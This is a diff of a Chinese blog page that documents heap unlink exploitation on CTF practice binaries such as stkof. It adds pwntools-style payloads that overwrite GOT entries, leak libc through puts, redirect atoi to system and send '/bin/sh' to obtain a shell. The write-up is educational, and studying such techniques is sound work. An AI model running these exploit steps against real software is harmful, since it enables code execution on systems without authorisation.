@@ -19,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>堆溢出之unlink - 虽然没什么用但还是想记下来</title>
+  <title>堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -384,7 +384,7 @@
     
     
       <h1 class="title">
-        堆溢出之unlink
+        堆利用(二)之unlink⌛️
       </h1>
       <div class='new-meta-box'>
         
@@ -419,7 +419,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="堆溢出之unlink" data-path="/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/">
+      <div id="lc-pv" data-title="堆利用(二)之unlink⌛️" data-path="/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -454,6 +454,7 @@
 <p>对于32位，fd设为(&amp;P - 3X4)，bk设为(&amp;P - 2 X 4)</p>
 <p>对于64位，fd设为(&amp;P - 3X8)，bk设为(&amp;P - 2 X 8)</p>
 <p>最终的效果就是chunk里面写上了FD的值。</p>
+<p>前提：要求PIE没有开启！(PIE会使得基址可变)</p>
 <p>参考示例代码 <a target="_blank" rel="noopener" href="https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c">https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603430</span>:	<span class="number">0x0000000000602048</span>	<span class="number">0x0000000000602050</span></span><br></pre></td></tr></table></figure>
 
@@ -529,40 +530,62 @@
 <p>在此edit 0号块，其实是从 0x602300 - 0x18处开始编辑的。</p>
 <p>![75DE81B2-85CF-4519-8E72-B40E21AC6AFB](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/75DE81B2-85CF-4519-8E72-B40E21AC6AFB.png)</p>
 <p>调试的时候发现调用了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>] <span class="comment">#0x602060</span></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>] <span class="comment">#0x602018</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">&quot;puts&quot;</span>] <span class="comment">#0x400740</span></span><br></pre></td></tr></table></figure>
 
 
 
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>   <span class="comment">#填充</span></span><br><span class="line">py += p64(atoi_got)	<span class="comment">#0号块</span></span><br><span class="line">py += p64(atoi_got)	<span class="comment">#1号块</span></span><br><span class="line">py += p64(free_got)	<span class="comment">#2号块</span></span><br><span class="line">py += p64(<span class="number">9</span>)*<span class="number">6</span> <span class="comment">#填充</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,py)</span><br></pre></td></tr></table></figure>
+
+<p>![截屏2021-01-30 下午5.41.43](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午5.41.43.png)</p>
+<p>![截屏2021-01-30 下午5.47.54](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午5.47.54.png)</p>
+<p>这一步会让堆块指向我们填入的地址。再次edit堆块的时候，其实edit的是填入地址的值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(puts_plt)) <span class="comment">#将原来的free改成puts_plt</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#其实就是输出0号块</span></span><br><span class="line">rc(<span class="number">1</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;atoi&quot;</span>] <span class="comment">#减掉偏移</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;addr---&gt;&quot;</span>+hex(addr) <span class="comment">#输出的是基地址</span></span><br><span class="line">system = addr + libc.sym[<span class="string">&quot;system&quot;</span>] <span class="comment">#system的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>地址如下：</p>
+<p>![截屏2021-01-30 下午7.18.13](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.18.13.png)</p>
+<p>接下来将1号块改为<code>system</code>的地址<code>edit(1,0x10,p64(system))</code></p>
+<p>![截屏2021-01-30 下午7.22.39](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.22.39.png)</p>
+<p>再次调用atoi函数的时候，就会跳转到system。</p>
+<p>![截屏2021-01-30 下午11.40.55](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午11.40.55.png)</p>
+<p>ida中查看发现，每次最开始输入完菜单之后，都会运行一次atoi，所以再次直接输入参数/bin/sh即可getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 
 
+<p>例题3: stkof</p>
+<p>程序运行时没有提示</p>
+<p>![截屏2021-01-30 下午7.38.13](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.38.13.png)</p>
+<p>首选构造的fake_chunk如下</p>
+<p>![截屏2021-01-31 上午12.25.07](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.25.07.png)</p>
+<p>覆盖下一个堆块的size头后，如下</p>
+<p>![截屏2021-01-31 上午12.26.19](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.26.19.png)</p>
+<p>free之后，2号和3号合并。再edit 2号块，实际上就是在edit  ptr - 0x18的位置处的值。</p>
+<p><code>edit(2,0x10,&#39;AAA&#39;)</code></p>
+<p>![截屏2021-01-31 上午12.32.53](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.32.53.png)</p>
+<p>![截屏2021-01-31 上午12.34.50](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.34.50.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py1 += p64(<span class="number">0</span>) + p64(atoi_got) + p64(puts_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,len(py1),py1)</span><br></pre></td></tr></table></figure>
+
+<p>![截屏2021-01-31 上午12.39.16](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.39.16.png)</p>
+<p>此时0x602150处的值是0x602018，再次edit 2号块，实际上edit的是0x602018处的值。原本是free函数，就会把其改成相应的值。</p>
+<p>![截屏2021-01-31 上午12.44.49](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.44.49.png)</p>
+<p>![截屏2021-01-31 上午12.45.47](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.45.47.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py2 += p64(puts_plt)</span><br><span class="line">edit(<span class="number">2</span>,len(py2),py2)</span><br></pre></td></tr></table></figure>
+
+<p>这样就把free函数改成了puts_plt。</p>
+<p>![截屏2021-02-02 上午12.06.09](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.06.09.png)</p>
+<p>![截屏2021-01-31 上午12.49.18](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.49.18.png)</p>
+<p>![截屏2021-02-02 上午12.32.06](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.32.06.png)</p>
+<p>free所在的堆块号为2，前面的puts_got为堆块1。用puts_plt泄漏出pus_got的地址 <code>puts_addr---&gt;0x7ffff7a7c6a0</code></p>
+<p>然后就可以找到system的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>] + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p>刚才覆盖的atoi的堆块为0号，将其改为system</p>
+<p>![截屏2021-02-02 上午12.40.34](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.40.34.png)</p>
+<p>直接传入参数/bin/sh即可。</p>
+<p>![截屏2021-02-02 上午12.41.54](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.41.54.png)</p>
+<p>可参考如下文章 <a target="_blank" rel="noopener" href="https://wzt.ac.cn/2018/10/16/s-pwn-project-4/">https://wzt.ac.cn/2018/10/16/s-pwn-project-4/</a></p>
 
   
   
@@ -597,10 +620,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-27T14:02:31+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-02T00:48:36+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jan 27, 2021</p>
+    <p>更新于：Feb 2, 2021</p>
   </a>
 </div>
 
@@ -619,7 +642,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆溢出之unlink - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -631,7 +654,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆溢出之unlink - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -643,7 +666,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆溢出之unlink - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -674,7 +697,7 @@
     <div class="prev-next">
       
         <a class='prev' href='/2021/01/23/%E6%81%B6%E6%84%8FURL%E6%A3%80%E6%B5%8B%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%BA%8C/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>恶意URL检测代码实现二</p>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>恶意URL检测(二)代码实现</p>
           <p class='content'>问题1：python3中安装了 sk-learn，但脚本中不能导入
 可能是python3.8的版本问题，改为用python2。在运行脚本的时候也要用python2。
 参考 https://www...</p>
@@ -732,7 +755,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="堆溢出之unlink";
+  pdata.postTitle="堆利用(二)之unlink⌛️";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
